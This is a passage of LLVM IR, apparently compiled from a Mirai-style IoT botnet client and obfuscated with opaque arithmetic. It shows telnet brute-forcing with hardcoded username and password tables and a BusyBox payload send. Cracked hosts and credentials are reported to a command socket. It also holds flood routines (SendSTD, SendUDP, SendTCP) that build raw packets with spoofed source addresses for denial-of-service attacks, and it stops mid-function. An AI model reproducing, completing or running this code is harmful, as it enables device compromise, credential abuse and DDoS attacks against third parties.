  %784 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %783, i32 0, i32 0
  %785 = load i32, i32* %784, align 16
  %786 = call i64 @send(i32 %785, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.494, i32 0, i32 0), i64 7, i32 16384)
  %787 = icmp slt i64 %786, 0
  br i1 %787, label %788, label %789

; <label>:788:                                    ; preds = %780
  br label %789

; <label>:789:                                    ; preds = %788, %780
  %790 = load i32, i32* %6, align 4
  %791 = sext i32 %790 to i64
  %792 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %791
  %793 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %792, i32 0, i32 0
  %794 = load i32, i32* %793, align 16
  %795 = load i8*, i8** @Busybox_Payload, align 8
  %796 = load i8*, i8** @Busybox_Payload, align 8
  %797 = call i64 @strlen(i8* %796) #9
  %798 = call i64 @send(i32 %794, i8* %795, i64 %797, i32 16384)
  %799 = icmp slt i64 %798, 0
  br i1 %799, label %800, label %804

; <label>:800:                                    ; preds = %789
  %801 = load i32, i32* %6, align 4
  %802 = sext i32 %801 to i64
  %803 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %802
  call void @reset_telstate(%struct.telstate_t* %803)
  br label %930

; <label>:804:                                    ; preds = %789
  %805 = load i32, i32* @mainCommSock, align 4
  %806 = load i32, i32* %6, align 4
  %807 = sext i32 %806 to i64
  %808 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %807
  %809 = call i8* @get_telstate_host(%struct.telstate_t* %808)
  %810 = load i32, i32* %6, align 4
  %811 = sext i32 %810 to i64
  %812 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %811
  %813 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %812, i32 0, i32 4
  %814 = load i8, i8* %813, align 2
  %815 = zext i8 %814 to i64
  %816 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Usernames, i64 0, i64 %815
  %817 = load i8*, i8** %816, align 8
  %818 = load i32, i32* %6, align 4
  %819 = sext i32 %818 to i64
  %820 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %819
  %821 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %820, i32 0, i32 5
  %822 = load i8, i8* %821, align 1
  %823 = zext i8 %822 to i64
  %824 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Passwords, i64 0, i64 %823
  %825 = load i8*, i8** %824, align 8
  %826 = call i32 (i32, i8*, ...) @sockprintf(i32 %805, i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.495, i32 0, i32 0), i8* %809, i8* %817, i8* %825)
  %827 = load i32, i32* %6, align 4
  %828 = sext i32 %827 to i64
  %829 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %828
  %830 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %829, i32 0, i32 0
  %831 = load i32, i32* %830, align 16
  %832 = load i32, i32* %3, align 4
  %833 = load i32, i32* %6, align 4
  %834 = sext i32 %833 to i64
  %835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %834
  %836 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %835, i32 0, i32 9
  %837 = load i8*, i8** %836, align 8
  %838 = call i32 @read_until_response(i32 %831, i32 %832, i8* %837, i32 1024, i8** bitcast ([10 x i8]* @.str.499 to i8**))
  %839 = icmp ne i32 %838, 0
  br i1 %839, label %840, label %880

; <label>:840:                                    ; preds = %804
  %841 = load i32, i32* %6, align 4
  %842 = sext i32 %841 to i64
  %843 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %842
  %844 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %843, i32 0, i32 9
  %845 = load i8*, i8** %844, align 8
  %846 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %845, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.496, i32 0, i32 0))
  %847 = icmp ne i32 %846, 0
  br i1 %847, label %848, label %879

; <label>:848:                                    ; preds = %840
  %849 = load i32, i32* %6, align 4
  %850 = sext i32 %849 to i64
  %851 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %850
  %852 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %851, i32 0, i32 3
  %853 = load i8, i8* %852, align 1
  %854 = zext i8 %853 to i32
  %855 = icmp ne i32 %854, 3
  br i1 %855, label %856, label %879

; <label>:856:                                    ; preds = %848
  %857 = load i32, i32* @mainCommSock, align 4
  %858 = load i32, i32* %6, align 4
  %859 = sext i32 %858 to i64
  %860 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %859
  %861 = call i8* @get_telstate_host(%struct.telstate_t* %860)
  %862 = load i32, i32* %6, align 4
  %863 = sext i32 %862 to i64
  %864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %863
  %865 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %864, i32 0, i32 4
  %866 = load i8, i8* %865, align 2
  %867 = zext i8 %866 to i64
  %868 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Usernames, i64 0, i64 %867
  %869 = load i8*, i8** %868, align 8
  %870 = load i32, i32* %6, align 4
  %871 = sext i32 %870 to i64
  %872 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %871
  %873 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %872, i32 0, i32 5
  %874 = load i8, i8* %873, align 1
  %875 = zext i8 %874 to i64
  %876 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Passwords, i64 0, i64 %875
  %877 = load i8*, i8** %876, align 8
  %878 = call i32 (i32, i8*, ...) @sockprintf(i32 %857, i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.497, i32 0, i32 0), i8* %861, i8* %869, i8* %877)
  br label %879

; <label>:879:                                    ; preds = %856, %848, %840
  br label %880

; <label>:880:                                    ; preds = %879, %804
  %881 = load i32, i32* %6, align 4
  %882 = sext i32 %881 to i64
  %883 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %882
  %884 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %883, i32 0, i32 7
  %885 = load i32, i32* %884, align 16
  %886 = sub i32 %885, -1733414752
  %887 = add i32 %886, 45
  %888 = add i32 %887, -1733414752
  %889 = add i32 %885, 45
  %890 = zext i32 %888 to i64
  %891 = call i64 @time(i64* null) #5
  %892 = icmp slt i64 %890, %891
  br i1 %892, label %893, label %928

; <label>:893:                                    ; preds = %880
  %894 = load i32, i32* %6, align 4
  %895 = sext i32 %894 to i64
  %896 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %895
  %897 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %896, i32 0, i32 3
  %898 = load i8, i8* %897, align 1
  %899 = zext i8 %898 to i32
  %900 = icmp ne i32 %899, 3
  br i1 %900, label %901, label %924

; <label>:901:                                    ; preds = %893
  %902 = load i32, i32* @mainCommSock, align 4
  %903 = load i32, i32* %6, align 4
  %904 = sext i32 %903 to i64
  %905 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %904
  %906 = call i8* @get_telstate_host(%struct.telstate_t* %905)
  %907 = load i32, i32* %6, align 4
  %908 = sext i32 %907 to i64
  %909 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %908
  %910 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %909, i32 0, i32 4
  %911 = load i8, i8* %910, align 2
  %912 = zext i8 %911 to i64
  %913 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Usernames, i64 0, i64 %912
  %914 = load i8*, i8** %913, align 8
  %915 = load i32, i32* %6, align 4
  %916 = sext i32 %915 to i64
  %917 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %916
  %918 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %917, i32 0, i32 5
  %919 = load i8, i8* %918, align 1
  %920 = zext i8 %919 to i64
  %921 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Passwords, i64 0, i64 %920
  %922 = load i8*, i8** %921, align 8
  %923 = call i32 (i32, i8*, ...) @sockprintf(i32 %902, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.498, i32 0, i32 0), i8* %906, i8* %914, i8* %922)
  br label %924

; <label>:924:                                    ; preds = %901, %893
  %925 = load i32, i32* %6, align 4
  %926 = sext i32 %925 to i64
  %927 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %926
  call void @reset_telstate(%struct.telstate_t* %927)
  br label %928

; <label>:928:                                    ; preds = %924, %880
  br label %929

; <label>:929:                                    ; preds = %928, %739, %682, %575, %533, %475, %433, %377, %258, %95
  br label %930

; <label>:930:                                    ; preds = %929, %800, %735, %696, %663, %571, %559, %515, %471, %459, %414, %356, %352, %208, %177
  %931 = load i32, i32* %6, align 4
  %932 = add i32 %931, 87095681
  %933 = add i32 %932, 1
  %934 = sub i32 %933, 87095681
  %935 = add nsw i32 %931, 1
  store i32 %934, i32* %6, align 4
  br label %77

; <label>:936:                                    ; preds = %77
  br label %75
                                                  ; No predecessors!
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @SendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #5
  store i32 %12, i32* %7, align 4
  %13 = call i64 @time(i64* null) #5
  store i64 %13, i64* %8, align 8
  %14 = load i8*, i8** %4, align 8
  %15 = call %struct.hostent* @gethostbyname(i8* %14)
  store %struct.hostent* %15, %struct.hostent** %10, align 8
  %16 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %16, i8 0, i64 16, i32 4, i1 false)
  %17 = load %struct.hostent*, %struct.hostent** %10, align 8
  %18 = getelementptr inbounds %struct.hostent, %struct.hostent* %17, i32 0, i32 4
  %19 = load i8**, i8*** %18, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %23 = bitcast %struct.in_addr* %22 to i8*
  %24 = load %struct.hostent*, %struct.hostent** %10, align 8
  %25 = getelementptr inbounds %struct.hostent, %struct.hostent* %24, i32 0, i32 3
  %26 = load i32, i32* %25, align 4
  %27 = sext i32 %26 to i64
  call void @bcopy(i8* %21, i8* %23, i64 %27) #5
  %28 = load %struct.hostent*, %struct.hostent** %10, align 8
  %29 = getelementptr inbounds %struct.hostent, %struct.hostent* %28, i32 0, i32 2
  %30 = load i32, i32* %29, align 8
  %31 = trunc i32 %30 to i16
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %31, i16* %32, align 4
  %33 = load i32, i32* %5, align 4
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  store i32 0, i32* %11, align 4
  br label %36

; <label>:36:                                     ; preds = %58, %3
  %37 = load i32, i32* %11, align 4
  %38 = icmp uge i32 %37, 50
  br i1 %38, label %39, label %58

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %7, align 4
  %41 = call i64 @send(i32 %40, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.500, i32 0, i32 0), i64 65, i32 0)
  %42 = load i32, i32* %7, align 4
  %43 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %44 = call i32 @connect(i32 %42, %struct.sockaddr* %43, i32 16)
  %45 = call i64 @time(i64* null) #5
  %46 = load i64, i64* %8, align 8
  %47 = load i32, i32* %6, align 4
  %48 = sext i32 %47 to i64
  %49 = add i64 %46, 8250412868253344453
  %50 = add i64 %49, %48
  %51 = sub i64 %50, 8250412868253344453
  %52 = add nsw i64 %46, %48
  %53 = icmp sge i64 %45, %51
  br i1 %53, label %54, label %57

; <label>:54:                                     ; preds = %39
  %55 = load i32, i32* %7, align 4
  %56 = call i32 @close(i32 %55)
  call void @_exit(i32 0) #11
  unreachable

; <label>:57:                                     ; preds = %39
  store i32 0, i32* %11, align 4
  br label %58

; <label>:58:                                     ; preds = %57, %36
  %59 = load i32, i32* %11, align 4
  %60 = add i32 %59, 659431593
  %61 = add i32 %60, 1
  %62 = sub i32 %61, 659431593
  %63 = add i32 %59, 1
  store i32 %62, i32* %11, align 4
  br label %36
                                                  ; No predecessors!
  ret void
}

declare %struct.hostent* @gethostbyname(i8*) #1

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #3

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define void @SendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %8, align 4
  %26 = icmp eq i32 %25, 0
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %6
  %28 = call i32 @rand_cmwc()
  %29 = trunc i32 %28 to i16
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %29, i16* %30, align 2
  br label %36

; <label>:31:                                     ; preds = %6
  %32 = load i32, i32* %8, align 4
  %33 = trunc i32 %32 to i16
  %34 = call zeroext i16 @htons(i16 zeroext %33) #10
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  br label %36

; <label>:36:                                     ; preds = %31, %27
  %37 = load i8*, i8** %7, align 8
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %39 = call i32 @getHost(i8* %37, %struct.in_addr* %38)
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %36
  br label %240

; <label>:42:                                     ; preds = %36
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %44 = getelementptr inbounds [8 x i8], [8 x i8]* %43, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 8, i32 4, i1 false)
  %45 = load i32, i32* %11, align 4
  store i32 %45, i32* %14, align 4
  %46 = call i32 @socket(i32 2, i32 3, i32 17) #5
  store i32 %46, i32* %15, align 4
  %47 = load i32, i32* %15, align 4
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %50, label %49

; <label>:49:                                     ; preds = %42
  br label %240

; <label>:50:                                     ; preds = %42
  store i32 1, i32* %16, align 4
  %51 = load i32, i32* %15, align 4
  %52 = bitcast i32* %16 to i8*
  %53 = call i32 @setsockopt(i32 %51, i32 0, i32 3, i8* %52, i32 4) #5
  %54 = icmp slt i32 %53, 0
  br i1 %54, label %55, label %56

; <label>:55:                                     ; preds = %50
  br label %240

; <label>:56:                                     ; preds = %50
  store i32 50, i32* %17, align 4
  br label %57

; <label>:57:                                     ; preds = %65, %56
  %58 = load i32, i32* %17, align 4
  %59 = sub i32 0, %58
  %60 = sub i32 0, -1
  %61 = add i32 %59, %60
  %62 = sub i32 0, %61
  %63 = add nsw i32 %58, -1
  store i32 %62, i32* %17, align 4
  %64 = icmp ne i32 %58, 0
  br i1 %64, label %65, label %77

; <label>:65:                                     ; preds = %57
  %66 = call i64 @time(i64* null) #5
  %67 = call i32 @rand_cmwc()
  %68 = zext i32 %67 to i64
  %69 = xor i64 %66, -1
  %70 = and i64 %68, %69
  %71 = xor i64 %68, -1
  %72 = and i64 %66, %71
  %73 = or i64 %70, %72
  %74 = xor i64 %66, %68
  %75 = trunc i64 %73 to i32
  call void @srand(i32 %75) #5
  %76 = call i32 @rand() #5
  call void @init_rand(i32 %76)
  br label %57

; <label>:77:                                     ; preds = %57
  %78 = load i32, i32* %12, align 4
  %79 = sub i32 0, %78
  %80 = add i32 32, %79
  %81 = sub nsw i32 32, %78
  %82 = shl i32 1, %80
  %83 = add i32 %82, -258456050
  %84 = sub i32 %83, 1
  %85 = sub i32 %84, -258456050
  %86 = sub nsw i32 %82, 1
  %87 = xor i32 %85, -1
  %88 = and i32 -1, %87
  %89 = xor i32 -1, -1
  %90 = and i32 %85, %89
  %91 = or i32 %88, %90
  %92 = xor i32 %85, -1
  store i32 %91, i32* %18, align 4
  %93 = load i32, i32* %10, align 4
  %94 = sext i32 %93 to i64
  %95 = add i64 28, 3746917816422003645
  %96 = add i64 %95, %94
  %97 = sub i64 %96, 3746917816422003645
  %98 = add i64 28, %94
  %99 = call i8* @llvm.stacksave()
  store i8* %99, i8** %19, align 8
  %100 = alloca i8, i64 %97, align 16
  %101 = bitcast i8* %100 to %struct.iphdr*
  store %struct.iphdr* %101, %struct.iphdr** %20, align 8
  %102 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %103 = bitcast %struct.iphdr* %102 to i8*
  %104 = getelementptr i8, i8* %103, i64 20
  %105 = bitcast i8* %104 to %struct.udphdr*
  store %struct.udphdr* %105, %struct.udphdr** %21, align 8
  %106 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %107 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %108 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %107, i32 0, i32 0
  %109 = load i32, i32* %108, align 4
  %110 = load i32, i32* %18, align 4
  %111 = call i32 @getRandomIP(i32 %110)
  %112 = call i32 @htonl(i32 %111) #10
  %113 = load i32, i32* %10, align 4
  %114 = sext i32 %113 to i64
  %115 = add i64 8, 7622720702883222116
  %116 = add i64 %115, %114
  %117 = sub i64 %116, 7622720702883222116
  %118 = add i64 8, %114
  %119 = trunc i64 %117 to i32
  call void @makeIPPacket(%struct.iphdr* %106, i32 %109, i32 %112, i8 zeroext 17, i32 %119)
  %120 = load i32, i32* %10, align 4
  %121 = sext i32 %120 to i64
  %122 = sub i64 8, -4309991532368715946
  %123 = add i64 %122, %121
  %124 = add i64 %123, -4309991532368715946
  %125 = add i64 8, %121
  %126 = trunc i64 %124 to i16
  %127 = call zeroext i16 @htons(i16 zeroext %126) #10
  %128 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %129 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %128, i32 0, i32 0
  %130 = bitcast %union.anon.1* %129 to %struct.anon.2*
  %131 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %130, i32 0, i32 2
  store i16 %127, i16* %131, align 2
  %132 = call i32 @rand_cmwc()
  %133 = trunc i32 %132 to i16
  %134 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %135 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %134, i32 0, i32 0
  %136 = bitcast %union.anon.1* %135 to %struct.anon.2*
  %137 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %136, i32 0, i32 0
  store i16 %133, i16* %137, align 2
  %138 = load i32, i32* %8, align 4
  %139 = icmp eq i32 %138, 0
  br i1 %139, label %140, label %142

; <label>:140:                                    ; preds = %77
  %141 = call i32 @rand_cmwc()
  br label %147

; <label>:142:                                    ; preds = %77
  %143 = load i32, i32* %8, align 4
  %144 = trunc i32 %143 to i16
  %145 = call zeroext i16 @htons(i16 zeroext %144) #10
  %146 = zext i16 %145 to i32
  br label %147

; <label>:147:                                    ; preds = %142, %140
  %148 = phi i32 [ %141, %140 ], [ %146, %142 ]
  %149 = trunc i32 %148 to i16
  %150 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %151 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %150, i32 0, i32 0
  %152 = bitcast %union.anon.1* %151 to %struct.anon.2*
  %153 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %152, i32 0, i32 1
  store i16 %149, i16* %153, align 2
  %154 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %155 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %154, i32 0, i32 0
  %156 = bitcast %union.anon.1* %155 to %struct.anon.2*
  %157 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %156, i32 0, i32 3
  store i16 0, i16* %157, align 2
  %158 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %159 = bitcast %struct.udphdr* %158 to i8*
  %160 = getelementptr inbounds i8, i8* %159, i64 8
  %161 = load i32, i32* %10, align 4
  call void @makeRandomStr(i8* %160, i32 %161)
  %162 = bitcast i8* %100 to i16*
  %163 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 2
  %165 = load i16, i16* %164, align 2
  %166 = zext i16 %165 to i32
  %167 = call zeroext i16 @csum(i16* %162, i32 %166)
  %168 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 7
  store i16 %167, i16* %169, align 2
  %170 = call i64 @time(i64* null) #5
  %171 = load i32, i32* %9, align 4
  %172 = sext i32 %171 to i64
  %173 = sub i64 0, %172
  %174 = sub i64 %170, %173
  %175 = add nsw i64 %170, %172
  %176 = trunc i64 %174 to i32
  store i32 %176, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %177

; <label>:177:                                    ; preds = %231, %230, %147
  br label %178

; <label>:178:                                    ; preds = %177
  %179 = load i32, i32* %15, align 4
  %180 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %181 = call i64 @sendto(i32 %179, i8* %100, i64 %97, i32 0, %struct.sockaddr* %180, i32 16)
  %182 = call i32 @rand_cmwc()
  %183 = trunc i32 %182 to i16
  %184 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %185 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %184, i32 0, i32 0
  %186 = bitcast %union.anon.1* %185 to %struct.anon.2*
  %187 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %186, i32 0, i32 0
  store i16 %183, i16* %187, align 2
  %188 = load i32, i32* %8, align 4
  %189 = icmp eq i32 %188, 0
  br i1 %189, label %190, label %192

; <label>:190:                                    ; preds = %178
  %191 = call i32 @rand_cmwc()
  br label %197

; <label>:192:                                    ; preds = %178
  %193 = load i32, i32* %8, align 4
  %194 = trunc i32 %193 to i16
  %195 = call zeroext i16 @htons(i16 zeroext %194) #10
  %196 = zext i16 %195 to i32
  br label %197

; <label>:197:                                    ; preds = %192, %190
  %198 = phi i32 [ %191, %190 ], [ %196, %192 ]
  %199 = trunc i32 %198 to i16
  %200 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %201 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %200, i32 0, i32 0
  %202 = bitcast %union.anon.1* %201 to %struct.anon.2*
  %203 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %202, i32 0, i32 1
  store i16 %199, i16* %203, align 2
  %204 = call i32 @rand_cmwc()
  %205 = trunc i32 %204 to i16
  %206 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 3
  store i16 %205, i16* %207, align 4
  %208 = load i32, i32* %18, align 4
  %209 = call i32 @getRandomIP(i32 %208)
  %210 = call i32 @htonl(i32 %209) #10
  %211 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %212 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %211, i32 0, i32 8
  store i32 %210, i32* %212, align 4
  %213 = bitcast i8* %100 to i16*
  %214 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 2
  %216 = load i16, i16* %215, align 2
  %217 = zext i16 %216 to i32
  %218 = call zeroext i16 @csum(i16* %213, i32 %217)
  %219 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %220 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %219, i32 0, i32 7
  store i16 %218, i16* %220, align 2
  %221 = load i32, i32* %23, align 4
  %222 = load i32, i32* %14, align 4
  %223 = icmp eq i32 %221, %222
  br i1 %223, label %224, label %231

; <label>:224:                                    ; preds = %197
  %225 = call i64 @time(i64* null) #5
  %226 = load i32, i32* %22, align 4
  %227 = sext i32 %226 to i64
  %228 = icmp sgt i64 %225, %227
  br i1 %228, label %229, label %230

; <label>:229:                                    ; preds = %224
  br label %238

; <label>:230:                                    ; preds = %224
  store i32 0, i32* %23, align 4
  br label %177

; <label>:231:                                    ; preds = %197
  %232 = load i32, i32* %23, align 4
  %233 = sub i32 0, %232
  %234 = sub i32 0, 1
  %235 = add i32 %233, %234
  %236 = sub i32 0, %235
  %237 = add i32 %232, 1
  store i32 %236, i32* %23, align 4
  br label %177

; <label>:238:                                    ; preds = %229
  %239 = load i8*, i8** %19, align 8
  call void @llvm.stackrestore(i8* %239)
  br label %240

; <label>:240:                                    ; preds = %238, %55, %49, %41
  ret void
}

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #6

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #5

; Function Attrs: noinline nounwind uwtable
define void @SendTCP(i8*, i32, i32, i8*, i32, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i8* %3, i8** %11, align 8
  store i32 %4, i32* %12, align 4
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %13, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #10
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  br label %537

; <label>:45:                                     ; preds = %39
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = call i32 @socket(i32 2, i32 3, i32 6) #5
  store i32 %48, i32* %17, align 4
  %49 = load i32, i32* %17, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %52, label %51

; <label>:51:                                     ; preds = %45
  br label %537

; <label>:52:                                     ; preds = %45
  store i32 1, i32* %18, align 4
  %53 = load i32, i32* %17, align 4
  %54 = bitcast i32* %18 to i8*
  %55 = call i32 @setsockopt(i32 %53, i32 0, i32 3, i8* %54, i32 4) #5
  %56 = icmp slt i32 %55, 0
  br i1 %56, label %57, label %58

; <label>:57:                                     ; preds = %52
